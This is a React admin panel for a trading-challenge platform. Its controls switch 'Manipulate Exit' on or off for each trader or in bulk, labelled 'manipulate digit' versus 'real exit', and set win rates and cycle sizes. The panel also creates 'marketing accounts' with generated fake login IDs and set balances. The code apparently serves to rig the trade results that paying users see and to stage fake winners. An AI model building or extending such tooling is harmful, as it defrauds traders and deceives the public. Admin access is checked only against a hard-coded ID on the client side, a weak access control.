import { useEffect, useState } from 'react';
import {
    getSettings,
    updateSettings,
    getFundedAccounts,
    createFundedAccount,
    getAllMarketingAccounts,
    upsertMarketingAccount,
    updateMarketingAccount,
    deleteMarketingAccount,
    getAllParticipants,
    updateParticipant,
    bulkUpdateMarketingAccounts,
    bulkUpdateParticipants,
} from '../../../Services/supabase';
import './admin-panel.scss';

const ADMIN_LOGIN_IDS = ['CR2357801'];

type TSettings = Record<string, number | string | number[] | string[]>;
type TParticipant = Record<string, string | number | boolean>;
type TFundedAccount = Record<string, string | number | boolean>;
type TMarketingAccount = Record<string, string | number | boolean>;

type TAdminPanelProps = { deriv_login_id: string };

const AdminPanel = ({ deriv_login_id }: TAdminPanelProps) => {
    const [is_admin, setIsAdmin] = useState(false);
    const [settings, setSettings] = useState<TSettings>({});
    const [participants, setParticipants] = useState<TParticipant[]>([]);
    const [funded_accounts, setFundedAccounts] = useState<TFundedAccount[]>([]);
    const [marketing_accounts, setMarketingAccounts] = useState<TMarketingAccount[]>([]);
    const [loading, setLoading] = useState(true);
    const [saving, setSaving] = useState(false);
    const [active_tab, setActiveTab] = useState('settings');
    const [save_msg, setSaveMsg] = useState('');

    // Selection state for bulk ops
    const [selected_marketing, setSelectedMarketing] = useState<Set<number>>(new Set());
    const [selected_participants, setSelectedParticipants] = useState<Set<string>>(new Set());

    // Bulk input state
    const [bulk_marketing, setBulkMarketing] = useState({ win_rate: '', cycle_size: '', manipulate_exit: '' });
    const [bulk_funded, setBulkFunded] = useState({ db_win_rate: '', db_cycle_size: '', use_db_exit_spots: '' });

    const [marketing_form, setMarketingForm] = useState({
        deriv_loginid: '',
        balance: 1000,
        win_rate: 7,
        cycle_size: 10,
    });

    useEffect(() => {
        if (ADMIN_LOGIN_IDS.includes(deriv_login_id)) {
            setIsAdmin(true);
            loadData();
        } else {
            setLoading(false);
        }
    }, [deriv_login_id]);

    const loadData = async () => {
        try {
            const [s, p, f, m] = await Promise.all([
                getSettings(),
                getAllParticipants(),
                getFundedAccounts(),
                getAllMarketingAccounts(),
            ]);
            setSettings(s || {});
            setParticipants(p || []);
            setFundedAccounts(f || []);
            setMarketingAccounts(m || []);
        } catch (e) {
            console.error('Admin load error:', e);
        } finally {
            setLoading(false);
        }
    };

    // ── Marketing handlers ────────────────────────────────────────────────────

    const handleCreateMarketing = async () => {
        if (!marketing_form.deriv_loginid.trim()) {
            alert('Please enter a Deriv Login ID.');
            return;
        }
        const fake_loginid = 'CR' + (Math.floor(Math.random() * 9000000) + 1000000);
        try {
            await upsertMarketingAccount({
                deriv_loginid: marketing_form.deriv_loginid.trim(),
                fake_loginid,
                balance: marketing_form.balance,
                start_balance: marketing_form.balance,
                win_rate: marketing_form.win_rate,
                cycle_size: marketing_form.cycle_size,
                trade_counter: 0,
                is_active: true,
                manipulate_exit: true,
            });
            setMarketingForm({ deriv_loginid: '', balance: 1000, win_rate: 7, cycle_size: 10 });
            await loadData();
            alert('Marketing account created!');
        } catch {
            alert('Failed to create marketing account.');
        }
    };

    const handleToggleMarketing = async (acc: TMarketingAccount) => {
        try {
            await updateMarketingAccount(acc.id as number, { is_active: !acc.is_active });
            await loadData();
        } catch {
            alert('Failed to toggle account.');
        }
    };

    const handleToggleManipulate = async (acc: TMarketingAccount) => {
        try {
            await updateMarketingAccount(acc.id as number, { manipulate_exit: !acc.manipulate_exit });
            await loadData();
        } catch {
            alert('Failed to update manipulation setting.');
        }
    };

    const handleUpdateMarketingRate = async (acc: TMarketingAccount, win_rate: number, cycle_size: number) => {
        try {
            await updateMarketingAccount(acc.id as number, { win_rate, cycle_size });
            await loadData();
        } catch {
            alert('Failed to update win rate.');
        }
    };

    const handleDeleteMarketing = async (acc: TMarketingAccount) => {
        if (!confirm(`Delete marketing account for ${acc.deriv_loginid}?`)) return;
        try {
            await deleteMarketingAccount(acc.id as string);
            await loadData();
        } catch {
            alert('Failed to delete account.');
        }
    };

    const handleResetBalance = async (acc: TMarketingAccount) => {
        const input = prompt(`Reset balance for ${acc.deriv_loginid} to:`, String(acc.start_balance));
        if (!input) return;
        try {
            await updateMarketingAccount(acc.id as number, { balance: parseFloat(input), trade_counter: 0 });
            await loadData();
        } catch {
            alert('Failed to reset balance.');
        }
    };

    const handleBulkMarketing = async () => {
        const updates: Record<string, unknown> = {};
        if (bulk_marketing.win_rate !== '') updates.win_rate = parseInt(bulk_marketing.win_rate);
        if (bulk_marketing.cycle_size !== '') updates.cycle_size = parseInt(bulk_marketing.cycle_size);
        if (bulk_marketing.manipulate_exit !== '') updates.manipulate_exit = bulk_marketing.manipulate_exit === 'true';
        if (Object.keys(updates).length === 0) {
            alert('No changes to apply.');
            return;
        }
        const ids = selected_marketing.size > 0 ? Array.from(selected_marketing) : null;
        const target = ids ? `${ids.length} selected` : 'ALL';
        if (!confirm(`Apply to ${target} marketing accounts?`)) return;
        try {
            const res: any = await bulkUpdateMarketingAccounts(ids, updates);
            alert(`Updated ${res.updated} accounts.`);
            setBulkMarketing({ win_rate: '', cycle_size: '', manipulate_exit: '' });
            setSelectedMarketing(new Set());
            await loadData();
        } catch {
            alert('Bulk update failed.');
        }
    };

    // ── Participant (funded) handlers ─────────────────────────────────────────

    const handleToggleFundedManipulate = async (p: TParticipant) => {
        try {
            await updateParticipant(p.deriv_login_id as string, { use_db_exit_spots: !p.use_db_exit_spots });
            await loadData();
        } catch {
            alert('Failed to update manipulation setting.');
        }
    };

    const handleUpdateFundedRate = async (p: TParticipant, db_win_rate: number, db_cycle_size: number) => {
        try {
            await updateParticipant(p.deriv_login_id as string, { db_win_rate, db_cycle_size });
            await loadData();
        } catch {
            alert('Failed to update win rate.');
        }
    };

    const handleBulkFunded = async () => {
        const updates: Record<string, unknown> = {};
        if (bulk_funded.db_win_rate !== '') updates.db_win_rate = parseFloat(bulk_funded.db_win_rate);
        if (bulk_funded.db_cycle_size !== '') updates.db_cycle_size = parseInt(bulk_funded.db_cycle_size);
        if (bulk_funded.use_db_exit_spots !== '') updates.use_db_exit_spots = bulk_funded.use_db_exit_spots === 'true';
        if (Object.keys(updates).length === 0) {
            alert('No changes to apply.');
            return;
        }
        const ids = selected_participants.size > 0 ? Array.from(selected_participants) : null;
        const target = ids ? `${ids.length} selected` : 'ALL';
        if (!confirm(`Apply to ${target} funded participants?`)) return;
        try {
            const res: any = await bulkUpdateParticipants(ids, updates);
            alert(`Updated ${res.updated} participants.`);
            setBulkFunded({ db_win_rate: '', db_cycle_size: '', use_db_exit_spots: '' });
            setSelectedParticipants(new Set());
            await loadData();
        } catch {
            alert('Bulk update failed.');
        }
    };

    // ── Challenge participant handlers ────────────────────────────────────────

    const handleSaveSettings = async () => {
        setSaving(true);
        try {
            await updateSettings(settings);
            setSaveMsg('Settings saved successfully!');
            setTimeout(() => setSaveMsg(''), 3000);
        } catch {
            setSaveMsg('Failed to save settings.');
        } finally {
            setSaving(false);
        }
    };

    const handleApproveFunded = async (participant: TParticipant) => {
        const amount = prompt(`Enter funded amount for ${participant.masked_login_id} (e.g. 1000):`);
        if (!amount) return;
        try {
            await createFundedAccount({
                deriv_loginid: participant.deriv_login_id,
                start_balance: parseFloat(amount),
                current_balance: parseFloat(amount),
            });
            await updateParticipant(participant.deriv_login_id as string, { phase_status: 'funded', current_phase: 3 });
            await loadData();
            alert('Funded account created successfully!');
        } catch {
            alert('Failed to create funded account.');
        }
    };

    const handleDisqualify = async (participant: TParticipant) => {
        const reason = prompt('Reason for manual disqualification:');
        if (!reason) return;
        try {
            await updateParticipant(participant.deriv_login_id as string, { is_disqualified: true });
            await loadData();
        } catch {
            alert('Failed to disqualify participant.');
        }
    };

    const updateSetting = (key: string, value: string | number) => setSettings(prev => ({ ...prev, [key]: value }));

    if (!is_admin)
        return (
            <div className='dpa-admin dpa-admin--denied'>
                <h2>Access Denied</h2>
                <p>You do not have admin privileges.</p>
            </div>
        );

    if (loading) return <div className='dpa-admin__loading'>Loading admin data...</div>;

    return (
        <div className='dpa-admin'>
            <div className='dpa-admin__header'>
                <h1>Admin Panel</h1>
                <span className='dpa-admin__badge'>Administrator</span>
            </div>

            <div className='dpa-admin__tabs'>
                {['settings', 'participants', 'funded', 'competition', 'marketing'].map(tab => (
                    <button
                        key={tab}
                        className={`dpa-admin__tab ${active_tab === tab ? 'active' : ''}`}
                        onClick={() => setActiveTab(tab)}
                    >
                        {tab.charAt(0).toUpperCase() + tab.slice(1)}
                    </button>
                ))}
            </div>

            {/* ── Settings Tab ── */}
            {active_tab === 'settings' && (
                <div className='dpa-admin__section'>
                    <h2>Challenge Settings</h2>
                    <div className='dpa-admin__settings-grid'>
                        {[
                            { key: 'phase1_profit_target', label: 'Phase 1 Profit Target (%)', type: 'number' },
                            { key: 'phase2_profit_target', label: 'Phase 2 Profit Target (%)', type: 'number' },
                            { key: 'phase3_profit_target', label: 'Phase 3 Profit Target (%)', type: 'number' },
                            { key: 'daily_drawdown_limit', label: 'Daily Drawdown Limit (%)', type: 'number' },
                            {
                                key: 'disqualification_threshold',
                                label: 'Disqualification Threshold (%)',
                                type: 'number',
                            },
                            { key: 'flips_required_to_reenter', label: 'Flips Required to Re-enter', type: 'number' },
                            { key: 'phase1_duration_days', label: 'Phase 1 Duration (days)', type: 'number' },
                            { key: 'phase2_duration_days', label: 'Phase 2 Duration (days)', type: 'number' },
                            { key: 'min_trading_days', label: 'Min Trading Days', type: 'number' },
                            { key: 'profit_split_trader', label: 'Trader Profit Split (%)', type: 'number' },
                        ].map(field => (
                            <div key={field.key} className='dpa-admin__field'>
                                <label>{field.label}</label>
                                <input
                                    type={field.type}
                                    value={(settings[field.key] as string | number) || ''}
                                    onChange={e =>
                                        updateSetting(
                                            field.key,
                                            field.type === 'number' ? parseFloat(e.target.value) : e.target.value
                                        )
                                    }
                                />
                            </div>
                        ))}
                    </div>
                    {save_msg && (
                        <div className={`dpa-admin__save-msg ${save_msg.includes('Failed') ? 'error' : 'success'}`}>
                            {save_msg}
                        </div>
                    )}
                    <button className='dpa-admin__save-btn' onClick={handleSaveSettings} disabled={saving}>
                        {saving ? 'Saving...' : 'Save Settings'}
                    </button>
                </div>
            )}

            {/* ── Participants Tab ── */}
            {active_tab === 'participants' && (
                <div className='dpa-admin__section'>
                    <h2>Challenge Participants ({participants.length})</h2>

                    {/* Funded exit bulk controls */}
                    <div className='dpa-admin__bulk-bar'>
                        <span className='dpa-admin__bulk-title'>
                            Funded Exit Control —{' '}
                            {selected_participants.size > 0 ? `${selected_participants.size} selected` : 'All users'}
                        </span>
                        <select
                            value={bulk_funded.use_db_exit_spots}
                            onChange={e => setBulkFunded(b => ({ ...b, use_db_exit_spots: e.target.value }))}
                        >
                            <option value=''>Manipulate Exit...</option>
                            <option value='true'>ON (manipulate digit)</option>
                            <option value='false'>OFF (real exit)</option>
                        </select>
                        <input
                            type='number'
                            placeholder='Win Rate'
                            min={1}
                            value={bulk_funded.db_win_rate}
                            onChange={e => setBulkFunded(b => ({ ...b, db_win_rate: e.target.value }))}
                            style={{ width: 90 }}
                        />
                        <input
                            type='number'
                            placeholder='Cycle Size'
                            min={1}
                            value={bulk_funded.db_cycle_size}
                            onChange={e => setBulkFunded(b => ({ ...b, db_cycle_size: e.target.value }))}
                            style={{ width: 90 }}
                        />
                        <button className='btn-approve' onClick={handleBulkFunded}>
                            Apply
                        </button>
                        {selected_participants.size > 0 && (
                            <button
                                className='btn-disqualify'
                                style={{ fontSize: 11 }}
                                onClick={() => setSelectedParticipants(new Set())}
                            >
                                Clear Selection
                            </button>
                        )}
                    </div>

                    <div className='dpa-admin__table-wrapper'>
                        <table className='dpa-admin__table'>
                            <thead>
                                <tr>
                                    <th>
                                        <input
                                            type='checkbox'
                                            checked={
                                                selected_participants.size === participants.length &&
                                                participants.length > 0
                                            }
                                            onChange={e =>
                                                setSelectedParticipants(
                                                    e.target.checked
                                                        ? new Set(participants.map(p => p.deriv_login_id as string))
                                                        : new Set()
                                                )
                                            }
                                        />
                                    </th>
                                    <th>Login ID</th>
                                    <th>Phase</th>
                                    <th>Status</th>
                                    <th>Balance</th>
                                    <th>Profit %</th>
                                    <th>Manipulate Exit</th>
                                    <th>Win Rate</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                {participants.map((p: TParticipant) => (
                                    <ParticipantRow
                                        key={p.id as string}
                                        p={p}
                                        selected={selected_participants.has(p.deriv_login_id as string)}
                                        onSelect={(id, checked) =>
                                            setSelectedParticipants(prev => {
                                                const s = new Set(prev);
                                                checked ? s.add(id) : s.delete(id);
                                                return s;
                                            })
                                        }
                                        onToggleManipulate={handleToggleFundedManipulate}
                                        onUpdateRate={handleUpdateFundedRate}
                                        onApproveFunded={handleApproveFunded}
                                        onDisqualify={handleDisqualify}
                                    />
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>
            )}

            {/* ── Funded Accounts Tab ── */}
            {active_tab === 'funded' && (
                <div className='dpa-admin__section'>
                    <h2>Funded Accounts ({funded_accounts.length})</h2>
                    <div className='dpa-admin__table-wrapper'>
                        <table className='dpa-admin__table'>
                            <thead>
                                <tr>
                                    <th>Login ID</th>
                                    <th>Amount</th>
                                    <th>Source</th>
                                    <th>Status</th>
                                    <th>Total Profit</th>
                                    <th>Split</th>
                                    <th>Approved</th>
                                </tr>
                            </thead>
                            <tbody>
                                {funded_accounts.map((f: TFundedAccount) => (
                                    <tr key={f.id as string}>
                                        <td className='login-id'>{f.masked_login_id as string}</td>
                                        <td>${(f.funded_amount as number)?.toFixed(2)}</td>
                                        <td>{f.source as string}</td>
                                        <td>
                                            <span className={`status-badge ${f.status as string}`}>
                                                {f.status as string}
                                            </span>
                                        </td>
                                        <td className={(f.total_profit as number) >= 0 ? 'profit' : 'loss'}>
                                            ${(f.total_profit as number)?.toFixed(2)}
                                        </td>
                                        <td>
                                            {f.profit_split_trader as number}% /{' '}
                                            {100 - (f.profit_split_trader as number)}%
                                        </td>
                                        <td>{f.approved_by as string}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>
            )}

            {/* ── Marketing Accounts Tab ── */}
            {active_tab === 'marketing' && (
                <div className='dpa-admin__section'>
                    <h2>Marketing Accounts ({marketing_accounts.length})</h2>

                    {/* Create form */}
                    <div
                        className='dpa-admin__settings-grid'
                        style={{ marginBottom: 24, background: '#f9f9f9', padding: 16, borderRadius: 8 }}
                    >
                        <div className='dpa-admin__field'>
                            <label>Deriv Login ID</label>
                            <input
                                type='text'
                                placeholder='e.g. CR1234567'
                                value={marketing_form.deriv_loginid}
                                onChange={e => setMarketingForm(f => ({ ...f, deriv_loginid: e.target.value }))}
                            />
                        </div>
                        <div className='dpa-admin__field'>
                            <label>Starting Balance ($)</label>
                            <input
                                type='number'
                                value={marketing_form.balance}
                                onChange={e => setMarketingForm(f => ({ ...f, balance: parseFloat(e.target.value) }))}
                            />
                        </div>
                        <div className='dpa-admin__field'>
                            <label>Win Rate</label>
                            <input
                                type='number'
                                min={1}
                                value={marketing_form.win_rate}
                                onChange={e => setMarketingForm(f => ({ ...f, win_rate: parseInt(e.target.value) }))}
                            />
                        </div>
                        <div className='dpa-admin__field'>
                            <label>Cycle Size</label>
                            <input
                                type='number'
                                min={1}
                                value={marketing_form.cycle_size}
                                onChange={e => setMarketingForm(f => ({ ...f, cycle_size: parseInt(e.target.value) }))}
                            />
                        </div>
                        <div className='dpa-admin__field' style={{ alignSelf: 'flex-end' }}>
                            <button className='btn-approve' onClick={handleCreateMarketing}>
                                + Assign User
                            </button>
                        </div>
                    </div>

                    {/* Bulk controls */}
                    <div className='dpa-admin__bulk-bar'>
                        <span className='dpa-admin__bulk-title'>
                            Bulk Update —{' '}
                            {selected_marketing.size > 0 ? `${selected_marketing.size} selected` : 'All accounts'}
                        </span>
                        <select
                            value={bulk_marketing.manipulate_exit}
                            onChange={e => setBulkMarketing(b => ({ ...b, manipulate_exit: e.target.value }))}
                        >
                            <option value=''>Manipulate Exit...</option>
                            <option value='true'>ON (manipulate digit)</option>
                            <option value='false'>OFF (real exit)</option>
                        </select>
                        <input
                            type='number'
                            placeholder='Win Rate'
                            min={1}
                            value={bulk_marketing.win_rate}
                            onChange={e => setBulkMarketing(b => ({ ...b, win_rate: e.target.value }))}
                            style={{ width: 90 }}
                        />
                        <input
                            type='number'
                            placeholder='Cycle Size'
                            min={1}
                            value={bulk_marketing.cycle_size}
                            onChange={e => setBulkMarketing(b => ({ ...b, cycle_size: e.target.value }))}
                            style={{ width: 90 }}
                        />
                        <button className='btn-approve' onClick={handleBulkMarketing}>
                            Apply
                        </button>
                        {selected_marketing.size > 0 && (
                            <button
                                className='btn-disqualify'
                                style={{ fontSize: 11 }}
                                onClick={() => setSelectedMarketing(new Set())}
                            >
                                Clear
                            </button>
                        )}
                    </div>

                    {/* Accounts table */}
                    {marketing_accounts.length === 0 ? (
                        <p style={{ color: '#999' }}>No marketing accounts assigned yet.</p>
                    ) : (
                        <div className='dpa-admin__table-wrapper'>
                            <table className='dpa-admin__table'>
                                <thead>
                                    <tr>
                                        <th>
                                            <input
                                                type='checkbox'
                                                checked={
                                                    selected_marketing.size === marketing_accounts.length &&
                                                    marketing_accounts.length > 0
                                                }
                                                onChange={e =>
                                                    setSelectedMarketing(
                                                        e.target.checked
                                                            ? new Set(marketing_accounts.map(a => a.id as number))
                                                            : new Set()
                                                    )
                                                }
                                            />
                                        </th>
                                        <th>Login ID</th>
                                        <th>Balance</th>
                                        <th>Win Rate</th>
                                        <th>Cycle</th>
                                        <th>Trades</th>
                                        <th>Manipulate Exit</th>
                                        <th>Status</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {marketing_accounts.map((acc: TMarketingAccount) => (
                                        <MarketingRow
                                            key={acc.id as string}
                                            acc={acc}
                                            selected={selected_marketing.has(acc.id as number)}
                                            onSelect={(id, checked) =>
                                                setSelectedMarketing(prev => {
                                                    const s = new Set(prev);
                                                    checked ? s.add(id) : s.delete(id);
                                                    return s;
                                                })
                                            }
                                            onToggleActive={handleToggleMarketing}
                                            onToggleManipulate={handleToggleManipulate}
                                            onUpdateRate={handleUpdateMarketingRate}
                                            onResetBalance={handleResetBalance}
                                            onDelete={handleDeleteMarketing}
                                        />
                                    ))}
                                </tbody>
                            </table>
                        </div>
                    )}
                </div>
            )}

            {/* ── Competition Tab ── */}
            {active_tab === 'competition' && (
                <div className='dpa-admin__section'>
                    <h2>Competition Control</h2>
                    <div className='dpa-admin__settings-grid'>
                        {[
                            { key: 'min_profit_for_top10', label: 'Min Profit for Top 10 ($)', type: 'number' },
                            { key: 'min_balance_for_top10', label: 'Min Balance for Top 10 ($)', type: 'number' },
                        ].map(field => (
                            <div key={field.key} className='dpa-admin__field'>
                                <label>{field.label}</label>
                                <input
                                    type={field.type}
                                    value={(settings[field.key] as string | number) || ''}
                                    onChange={e => updateSetting(field.key, parseFloat(e.target.value))}
                                />
                            </div>
                        ))}
                    </div>
                    <button className='dpa-admin__save-btn' onClick={handleSaveSettings} disabled={saving}>
                        {saving ? 'Saving...' : 'Save Competition Settings'}
                    </button>
                </div>
            )}
        </div>
    );
};

// ── Sub-components for inline editing ────────────────────────────────────────

const MarketingRow = ({
    acc,
    selected,
    onSelect,
    onToggleActive,
    onToggleManipulate,
    onUpdateRate,
    onResetBalance,
    onDelete,
}: {
    acc: TMarketingAccount;
    selected: boolean;
    onSelect: (id: number, checked: boolean) => void;
    onToggleActive: (acc: TMarketingAccount) => void;
    onToggleManipulate: (acc: TMarketingAccount) => void;
    onUpdateRate: (acc: TMarketingAccount, win_rate: number, cycle_size: number) => void;
    onResetBalance: (acc: TMarketingAccount) => void;
    onDelete: (acc: TMarketingAccount) => void;
}) => {
    const [win_rate, setWinRate] = useState(String(acc.win_rate));
    const [cycle_size, setCycleSize] = useState(String(acc.cycle_size));
    const dirty = win_rate !== String(acc.win_rate) || cycle_size !== String(acc.cycle_size);

    return (
        <tr className={selected ? 'row-selected' : ''}>
            <td>
                <input
                    type='checkbox'
                    checked={selected}
                    onChange={e => onSelect(acc.id as number, e.target.checked)}
                />
            </td>
            <td className='login-id'>{acc.deriv_loginid as string}</td>
            <td>${(acc.balance as number)?.toFixed(2)}</td>
            <td>
                <input
                    type='number'
                    min={1}
                    value={win_rate}
                    onChange={e => setWinRate(e.target.value)}
                    style={{ width: 55, textAlign: 'center' }}
                />
            </td>
            <td>
                <input
                    type='number'
                    min={1}
                    value={cycle_size}
                    onChange={e => setCycleSize(e.target.value)}
                    style={{ width: 55, textAlign: 'center' }}
                />
            </td>
            <td>{acc.trade_counter as number}</td>
            <td>
                <button
                    className={acc.manipulate_exit ? 'btn-approve' : 'btn-disqualify'}
                    style={{ minWidth: 70, fontSize: 12 }}
                    onClick={() => onToggleManipulate(acc)}
                >
                    {acc.manipulate_exit ? 'ON' : 'OFF'}
                </button>
            </td>
            <td>
                <span className={`status-badge ${acc.is_active ? 'active' : 'inactive'}`}>
                    {acc.is_active ? 'Active' : 'Off'}
                </span>
            </td>
            <td className='actions'>
                {dirty && (
                    <button
                        className='btn-approve'
                        style={{ background: '#e65100', fontSize: 11 }}
                        onClick={() => onUpdateRate(acc, parseInt(win_rate), parseInt(cycle_size))}
                    >
                        Save Rate
                    </button>
                )}
                <button
                    className={acc.is_active ? 'btn-disqualify' : 'btn-approve'}
                    onClick={() => onToggleActive(acc)}
                >
                    {acc.is_active ? 'Disable' : 'Enable'}
                </button>
                <button className='btn-approve' style={{ background: '#1565c0' }} onClick={() => onResetBalance(acc)}>
                    Reset
                </button>
                <button className='btn-disqualify' onClick={() => onDelete(acc)}>
                    Delete
                </button>
            </td>
        </tr>
    );
};

const ParticipantRow = ({
    p,
    selected,
    onSelect,
    onToggleManipulate,
    onUpdateRate,
    onApproveFunded,
    onDisqualify,
}: {
    p: TParticipant;
    selected: boolean;
    onSelect: (id: string, checked: boolean) => void;
    onToggleManipulate: (p: TParticipant) => void;
    onUpdateRate: (p: TParticipant, win_rate: number, cycle_size: number) => void;
    onApproveFunded: (p: TParticipant) => void;
    onDisqualify: (p: TParticipant) => void;
}) => {
    const [win_rate, setWinRate] = useState(String(p.db_win_rate ?? 7));
    const [cycle_size, setCycleSize] = useState(String(p.db_cycle_size ?? 10));
    const dirty = win_rate !== String(p.db_win_rate ?? 7) || cycle_size !== String(p.db_cycle_size ?? 10);

    return (
        <tr className={selected ? 'row-selected' : ''}>
            <td>
                <input
                    type='checkbox'
                    checked={selected}
                    onChange={e => onSelect(p.deriv_login_id as string, e.target.checked)}
                />
            </td>
            <td className='login-id'>{p.masked_login_id as string}</td>
            <td>Phase {p.current_phase as number}</td>
            <td>
                <span className={`status-badge ${p.phase_status as string}`}>
                    {p.is_disqualified ? 'Disqualified' : (p.phase_status as string)}
                </span>
            </td>
            <td>${(p.current_balance as number)?.toFixed(2)}</td>
            <td className={(p.profit_percent as number) >= 0 ? 'profit' : 'loss'}>
                {(p.profit_percent as number)?.toFixed(2)}%
            </td>
            <td>
                <button
                    className={p.use_db_exit_spots ? 'btn-approve' : 'btn-disqualify'}
                    style={{ minWidth: 70, fontSize: 12 }}
                    onClick={() => onToggleManipulate(p)}
                >
                    {p.use_db_exit_spots ? 'ON' : 'OFF'}
                </button>
            </td>
            <td style={{ display: 'flex', gap: 4, alignItems: 'center' }}>
                <input
                    type='number'
                    min={1}
                    value={win_rate}
                    onChange={e => setWinRate(e.target.value)}
                    style={{ width: 45, textAlign: 'center' }}
                />
                <span style={{ fontSize: 11, color: '#999' }}>/</span>
                <input
                    type='number'
                    min={1}
                    value={cycle_size}
                    onChange={e => setCycleSize(e.target.value)}
                    style={{ width: 45, textAlign: 'center' }}
                />
                {dirty && (
                    <button
                        className='btn-approve'
                        style={{ background: '#e65100', fontSize: 11, padding: '2px 6px' }}
                        onClick={() => onUpdateRate(p, parseInt(win_rate), parseInt(cycle_size))}
                    >
                        Save
                    </button>
                )}
            </td>
            <td className='actions'>
                {!p.is_disqualified && (
                    <>
                        <button className='btn-approve' onClick={() => onApproveFunded(p)}>
                            Fund
                        </button>
                        <button className='btn-disqualify' onClick={() => onDisqualify(p)}>
                            Disqualify
                        </button>
                    </>
                )}
            </td>
        </tr>
    );
};

export default AdminPanel;
